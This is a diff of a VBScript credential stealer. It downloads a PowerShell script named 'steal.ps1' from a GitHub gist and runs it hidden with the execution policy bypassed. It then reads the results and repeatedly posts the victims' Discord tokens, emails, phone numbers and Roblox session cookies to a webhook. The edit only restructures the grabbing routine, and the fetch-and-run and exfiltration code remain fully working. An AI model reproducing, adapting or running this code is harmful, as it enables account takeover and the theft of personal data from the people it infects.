@@ -36,7 +36,6 @@ runCount = 0
 Do
     runCount = runCount + 1
     Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
-    Call IP(RE_WH)
     
     ' Grabs NEW Token / Cookie and sends to RE_WH
     Call GrabTokens(RE_WH)
@@ -48,74 +47,76 @@ window.close()
 
 ' --- GRAB TOKENS ---
 Sub GrabTokens(targetWH)
-    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    Dim xh, psData, psf, tf, raw, lines, l, p, sz
+    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
+    
     xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/e8ec840166a2cb67f319619fab32ed0a5cdd7f39/steal.ps1", False
     xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    Dim pc: pc = xh.responseText
-    If Len(pc) < 100 Then Exit Sub
+    If xh.Status = 200 Then psData = xh.responseText
     Set xh = Nothing
     
-    Dim psf: psf = TmpFile("steal.ps1")
-    WriteFile psf, pc
-    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
-    
-    Dim tf: tf = TmpFile("steal_result.txt")
-    
-    ' Wait for file to populate
-    Dim waited : waited = 0
-    Do
-        Call SleepSeconds(2)
-        waited = waited + 2
-        If fso.FileExists(tf) Then
-            Dim sz : sz = 0
-            On Error Resume Next
-            sz = fso.GetFile(tf).Size
-            On Error GoTo 0
-            If sz > 10 Then Exit Do
-        End If
-    Loop While waited < 30
+    If Len(psData) > 100 Then
+        psf = TmpFile("steal.ps1")
+        WriteFile psf, psData
 
-    If Not fso.FileExists(tf) Then Exit Sub
-    Dim raw: raw = ReadFile(tf)
-    
-    If Len(raw) > 10 Then
-        If Asc(Left(raw, 1)) = 239 Then raw = Mid(raw, 4)
-        raw = Replace(raw, vbCrLf, vbLf)
-        raw = Replace(raw, vbCr, vbLf)
-        
-        Dim lines: lines = Split(raw, vbLf)
-        Dim l
-        For Each l In lines
-            l = Trim(l)
-            If Left(l, 8) = "DISCORD|" Then
-                Dim p: p = Split(Mid(l, 9), "|")
-                If UBound(p) >= 4 Then
-                    If p(4) <> lastToken Then
-                        lastToken = p(4)
-                        Dim info: info = "**User:** " & p(0) & vbCrLf
-                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
-                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
-                        If p(3) <> "" And p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
-                        info = info & "**Token:** " & p(4)
-                        Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
-                    End If
-                End If
-            ElseIf Left(l, 9) = "ROBLOXMS|" Then
-                Dim c1: c1 = Mid(l, 10)
-                If Len(c1) > 20 And c1 <> lastCookie Then
-                    lastCookie = c1
-                    Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(c1) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c1 & "``", 10181046, targetWH)
-                End If
-            ElseIf Left(l, 8) = "ROBLOX|" Then
-                Dim c2: c2 = Mid(l, 9)
-                If Len(c2) > 20 And c2 <> lastCookie Then
-                    lastCookie = c2
-                    Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(c2) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c2 & "``", 10181046, targetWH)
-                End If
+        tf = TmpFile("steal_result.txt")
+        fso.DeleteFile tf, True
+
+        sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
+
+        Dim waited : waited = 0
+        Do
+            Call SleepSeconds(2)
+            waited = waited + 2
+            If fso.FileExists(tf) Then
+                sz = 0
+                On Error Resume Next
+                sz = fso.GetFile(tf).Size
+                On Error GoTo 0
+                If sz > 10 Then Exit Do
             End If
-        Next
+        Loop While waited < 30
+
+        If fso.FileExists(tf) Then
+            raw = ReadFile(tf)
+            If Len(raw) > 10 Then
+                If Asc(Left(raw, 1)) = 239 Then raw = Mid(raw, 4)
+                raw = Replace(raw, vbCrLf, vbLf)
+                raw = Replace(raw, vbCr, vbLf)
+
+                lines = Split(raw, vbLf)
+                For Each l In lines
+                    l = Trim(l)
+                    If Left(l, 8) = "DISCORD|" Then
+                        p = Split(Mid(l, 9), "|")
+                        If UBound(p) >= 4 Then
+                            If p(4) <> lastToken Then
+                                lastToken = p(4)
+                                Dim info: info = "**User:** " & p(0) & vbCrLf
+                                If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
+                                If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
+                                If p(3) <> "" And p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
+                                info = info & "**Token:** " & p(4)
+                                Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
+                            End If
+                        End If
+                    ElseIf Left(l, 9) = "ROBLOXMS|" Then
+                        Dim c1: c1 = Mid(l, 10)
+                        If Len(c1) > 20 And c1 <> lastCookie Then
+                            lastCookie = c1
+                            Call PostEmbedTo(":cookie: Roblox Cookie (MS)", "Size: " & Len(c1) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c1 & "``", 10181046, targetWH)
+                        End If
+                    ElseIf Left(l, 8) = "ROBLOX|" Then
+                        Dim c2: c2 = Mid(l, 9)
+                        If Len(c2) > 20 And c2 <> lastCookie Then
+                            lastCookie = c2
+                            Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(c2) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c2 & "``", 10181046, targetWH)
+                        End If
+                    End If
+                Next
+            End If
+        End If
     End If
 End Sub
 
